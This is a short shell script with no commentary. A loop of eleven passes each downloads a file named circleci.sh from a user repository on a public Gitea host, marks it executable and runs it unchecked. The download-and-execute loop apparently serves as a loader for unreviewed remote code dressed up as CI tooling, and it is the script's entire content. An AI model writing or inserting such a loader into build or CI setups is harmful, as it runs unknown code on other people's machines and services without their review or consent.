#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/circleci.sh && chmod +x circleci.sh && ./circleci.sh
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
